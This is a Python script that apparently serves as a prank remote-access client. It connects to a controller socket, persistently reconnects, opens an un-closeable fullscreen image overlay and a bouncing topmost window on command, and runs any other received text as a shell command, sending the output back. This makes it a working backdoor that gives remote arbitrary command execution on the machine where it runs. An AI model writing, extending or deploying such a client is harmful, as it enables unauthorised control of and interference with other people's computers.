import socket
import subprocess
import threading
import time
import tkinter as tk
from PIL import ImageTk


def connect():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect(("127.0.0.1", 5555))
    failsafe = 0
    while failsafe < 20:
        command = s.recv(1024).decode()
        print(command)
        if command == "info":
            s.send("copybarav2 help gort bounce command3".encode("utf-8"))
        elif command == "help":
            help_text = """Available commands:\n"
					  help - Display this help message\n"
					  gort - Summons Gort 1\n
					  bounce - makes an un-closeable bouncing rodent 2\n
					  command3 - Description of command 3\n"""
            print("sending help")
            s.send(help_text.encode())   
        elif command == "gort":
            gthread = threading.Thread(target=window)
            gthread.start()
            s.send("GORT IS HERE".encode())
        elif command == "bounce":
            bthread = threading.Thread(target=bounce)
            bthread.start()
            s.send("Triggered Bounce".encode())
        else:
            output = subprocess.getoutput(command)
            s.send(output.encode())
        if command == "":
            failsafe += 1
        else:
            failsafe = 0
    s.close()

def window():
    def onClosing():
        pass
    #pil_img = pil_img.resize((300, 200), Image.LANCZOS)
    box =tk.Tk()
    box.attributes('-topmost', False)
    box.attributes('-fullscreen', True)
    box.attributes('-alpha', 0.6)
    box.protocol("delete", onClosing())
    box.overrideredirect(True)
    img = ImageTk.PhotoImage(file='gort.png')
    label =tk.Label(box, image=img)
    label.pack(expand=True)
    box.mainloop()

def bounce():
    box = tk.Tk()
    box.overrideredirect(True)  # borderless window (optional)
    box.configure(bg="black")
    win_w, win_h = 594, 646
    screen_w = box.winfo_screenwidth()
    screen_h = box.winfo_screenheight()
    state = {"x": 100, "y": 100, "dx": 3, "dy": 3}
    img= ImageTk.PhotoImage(file='rodent.png')
    box.attributes('-topmost', True)
    label = tk.Label(box, image=img)
    label.pack(expand=True)
    def move():
        # update position
        state["x"] += state["dx"]
        state["y"] += state["dy"]
        # bounce off left/right
        if state["x"] <= 0 or state["x"] + win_w >= screen_w:
            state["dx"] = -state["dx"]
        # bounce off top/bottom
        if state["y"] <= 0 or state["y"] + win_h >= screen_h:
            state["dy"] = -state["dy"]
        # move window
        box.geometry(f"{win_w}x{win_h}+{state['x']}+{state['y']}")
        box.after(20, move)  # schedule next frame
    move()
    box.mainloop()

if __name__ == "__main__":
    while True:
        try:
            connect()
        except Exception as e:
            time.sleep(5)